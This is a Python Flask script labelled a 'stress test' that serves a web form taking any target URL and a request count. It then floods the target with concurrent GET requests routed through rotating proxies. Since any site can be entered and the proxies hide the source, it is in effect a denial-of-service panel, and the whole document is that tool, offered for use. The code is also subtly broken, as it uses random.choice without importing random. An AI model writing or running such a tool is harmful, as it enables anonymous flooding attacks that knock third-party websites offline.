from flask import Flask, request
import asyncio
import aiohttp

app = Flask(__name__)

# list of proxies u could also use a file
proxies = [
    "http://proxy1:port",
    "http://proxy2:port",
    "http://proxy3:port",
    # ...
]

# function to send a single request
async def send_request(session, proxy, target_url):
    try:
        async with session.get(target_url, proxy=proxy) as response:
            if response.status != 200:
                print(f"[ERROR] Request failed with status code {response.status}")
            else:
                print(f"[SUCCESS] Request sent successfully")
    except Exception as e:
        print(f"[ERROR] Request failed with exception: {e}")

# function to start the stress test
async def start_stress_test(target_url, num_requests):
    # create a session
    async with aiohttp.ClientSession() as session:
        # create a list of tasks
        tasks = [send_request(session, random.choice(proxies), target_url) for _ in range(num_requests)]
        # run the tasks in parallel
        await asyncio.gather(*tasks)

@app.route('/')
def index():
    return '''
        <form method="POST" action="/stress">
            <input type="text" name="target_url" placeholder="Target URL">
            <input type="number" name="num_requests" placeholder="Number of requests">
            <input type="submit" value="Start stress test">
        </form>
    '''

@app.route('/stress', methods=['POST'])
def stress():
    target_url = request.form['target_url']
    num_requests = int(request.form['num_requests'])
    asyncio.run(start_stress_test(target_url, num_requests))
    return "Stress test started"

if __name__ == '__main__':
    app.run()
